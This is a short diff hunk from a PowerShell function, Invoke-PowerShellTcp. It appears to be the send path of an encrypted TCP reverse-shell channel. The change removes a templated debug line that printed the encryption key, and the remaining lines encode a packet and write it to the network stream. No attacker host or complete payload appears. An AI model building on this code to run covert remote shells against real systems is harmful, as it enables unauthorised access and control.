@@ -174,7 +174,6 @@ function Invoke-PowerShellTcp
         )
         $body = [byte[]](ConvertTo-Bson $Packet)
 
-        {{'Write-Debug "Key:  $($enc.getstring($key))"'|debug}}
         {{'Write-Debug "Sending:  $($enc.getstring($body))"'|debug}}
         $body = Decrypt-Code $body $KEY
         $Stream.Write($body, 0, $body.length)
